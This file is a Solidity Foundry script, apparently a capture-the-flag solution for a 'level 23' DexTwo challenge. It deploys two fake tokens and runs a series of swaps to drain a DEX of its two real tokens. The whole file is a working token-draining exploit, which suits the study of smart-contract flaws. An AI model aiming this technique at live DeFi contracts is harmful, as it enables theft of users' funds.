// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "src/level23.sol";

contract POC is Script {
    DexTwo level23;
    SwappableTokenTwo tokenA;
    SwappableTokenTwo tokenB;
    SwappableTokenTwo tokenC;
    SwappableTokenTwo tokenD;

    function setUp() public {
        // Defining contracts
        level23 = DexTwo(0x332D52E075825447b84A3113E77D4e1967f098fF);
    }

    function run() public {
        vm.startBroadcast();

        tokenA = SwappableTokenTwo(level23.token1());
        tokenB = SwappableTokenTwo(level23.token2());

        // Tokens that will be used to drain all tokens funds
        tokenC = new SwappableTokenTwo(
            address(level23),
            "Token C",
            "TKNC",
            110
        );

        tokenD = new SwappableTokenTwo(
            address(level23),
            "Token D",
            "TKND",
            110
        );

        tokenC.approve(address(level23), 100);
        tokenC.transfer(msg.sender, 10);
        tokenC.transfer(address(level23), 100);

        tokenD.approve(address(level23), 100);
        tokenD.transfer(msg.sender, 10);
        tokenD.transfer(address(level23), 100);

        level23.approve(address(level23), 1000);

        // Token A -> Token C
        level23.swap(address(tokenA), address(tokenC), 10);
        level23.swap(address(tokenC), address(tokenA), 20);
        level23.swap(address(tokenA), address(tokenC), 24);
        level23.swap(address(tokenC), address(tokenA), 30);
        level23.swap(address(tokenA), address(tokenC), 41);
        level23.swap(address(tokenC), address(tokenA), 45);

        // Token B -> Token D
        level23.swap(address(tokenB), address(tokenD), 10);
        level23.swap(address(tokenD), address(tokenB), 20);
        level23.swap(address(tokenB), address(tokenD), 24);
        level23.swap(address(tokenD), address(tokenB), 30);
        level23.swap(address(tokenB), address(tokenD), 41);
        level23.swap(address(tokenD), address(tokenB), 45);

        tokenA.balanceOf(address(level23));
        tokenB.balanceOf(address(level23));

        vm.stopBroadcast();
    }
}
